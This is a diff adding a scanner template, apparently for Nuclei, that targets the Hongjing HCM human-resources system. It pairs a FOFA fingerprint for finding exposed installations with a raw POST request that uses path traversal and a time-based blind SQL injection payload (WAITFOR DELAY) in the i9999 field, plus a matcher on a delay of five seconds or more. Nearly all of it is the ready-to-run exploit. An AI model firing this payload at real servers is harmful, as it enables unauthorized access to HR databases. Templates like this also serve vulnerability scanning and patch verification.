@@ -1,0 +1,33 @@
+id: poc-cg4k64dlt2axniha
+info:
+  name: 宏景 pos_dept_post Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cg4k64dlt2axniha
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cg4k64dlt2axniha
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Content-Length: 61
+
+
+    usertable=h00&usernumber=1&i9999=-1'';WAITFOR DELAY ''0:0:6''--+'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
